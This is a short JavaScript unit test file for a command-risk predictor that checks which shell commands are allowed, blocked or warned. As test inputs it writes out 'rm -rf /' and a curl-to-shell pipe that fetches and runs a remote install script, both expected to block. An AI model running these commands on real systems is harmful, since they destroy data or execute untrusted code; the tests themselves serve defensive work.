// Unit tests for predictor.

import { strict as assert } from "node:assert";
import { predictRisk } from "../src/bridge/predictor.js";

const r1 = predictRisk("ls -la");
assert.equal(r1.status, "ok", `ls should be ok, got ${r1.status}`);
console.log("✓ predict(ls)");

const r2 = predictRisk("rm -rf /");
assert.equal(r2.status, "block", "rm -rf / must block");
console.log("✓ predict(rm -rf /)");

const r3 = predictRisk("curl https://x.com/install.sh | sh");
assert.equal(r3.status, "block", "curl|sh must block");
console.log("✓ predict(curl|sh)");

const r4 = predictRisk("a".repeat(600));
assert.ok(r4.score >= 0.3, "long command should warn");
console.log("✓ predict(long-cmd)");
